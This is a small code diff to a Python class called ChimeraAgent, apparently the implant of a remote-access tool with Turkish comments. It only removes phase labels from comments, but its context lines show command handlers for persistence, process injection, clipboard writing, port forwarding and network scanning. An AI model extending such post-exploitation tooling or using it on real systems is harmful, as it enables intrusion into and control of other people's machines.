@@ -2477,7 +2477,7 @@ class ChimeraAgent:
         if cmd_lower == "persistence_remove":
             return self.remove_persistence()
 
-        # ── Process Injection / Migration (Faz 5.3) ──────────────────────
+        # ── Process Injection / Migration ──────────────────────
 
         # inject_list: Enjeksiyona uygun process'leri göster
         if cmd_lower == "inject_list":
@@ -2585,7 +2585,7 @@ class ChimeraAgent:
             except Exception as e:
                 return f"[!] Pano yazma hatası: {str(e)}"
 
-        # ── Port Forwarding (Faz 6.1) ────────────────────────────
+        # ── Port Forwarding ────────────────────────────
         if cmd_lower.startswith("portfwd "):
             try:
                 pf_parts = cmd.strip().split()
@@ -2636,7 +2636,7 @@ class ChimeraAgent:
             except Exception as e:
                 return f"[!] Port forwarding hatası: {e}"
 
-        # ── Network Scanner (Faz 6.2) ─────────────────────────────
+        # ── Network Scanner ─────────────────────────────
         if cmd_lower.startswith("netscan "):
             try:
                 ns_parts = cmd.strip().split()
